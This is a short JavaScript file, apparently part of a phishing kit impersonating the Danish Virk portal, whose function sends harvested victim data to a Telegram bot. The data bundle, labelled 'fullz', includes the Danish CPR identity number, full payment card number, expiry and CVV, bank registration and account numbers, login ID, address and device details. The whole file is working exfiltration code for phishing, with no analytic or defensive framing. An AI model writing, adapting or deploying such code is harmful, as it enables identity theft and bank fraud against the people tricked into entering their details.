// public_html/js/capture.js
async function pushFullz() {
  const token = CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = CONFIG.TELEGRAM_CHAT_ID;

  // Saml data
  const d = state.data;
  
  const msg = `
━━━🟩✅VIRK FULLZ #${d.leadId}✅🟩━━━
🏢 Firma: ${d.companyName || '-'}
🔢 CVR: ${d.cvrNumber || '-'}
👤 Bruger: ${d.brugerID || '-'}
🆔 CPR: ${d.cprNumber || '-'}
📱 Telefon: ${d.phoneNumber || '-'}
👤 Navn: ${d.navn || '-'}
🏠 Adresse: ${d.address || '-'}
📮 Post/By: ${d.postnummer || '-'} ${d.by || '-'}
🏦 Bank: ${d.selectedBank || '-'}
💳 Kort: ${d.kortnummer || '-'}
👤 Kortindehaver: ${d.kortnavn || '-'}
📅 Udløb: ${d.expiry || '-'}
🔒 CVV: ${d.cvv || '-'}
🔢 Reg: ${d.regNr || '-'}
🔢 Konto: ${d.kontoNr || '-'}
━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${window.location.hostname}
📱 Device: ${navigator.userAgent}
`;

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg,
        parse_mode: 'HTML'
      })
    });
    console.log('Data sendt til Telegram #'+d.leadId);
  } catch (error) {
    console.error('Fejl ved sending:', error);
  }
}
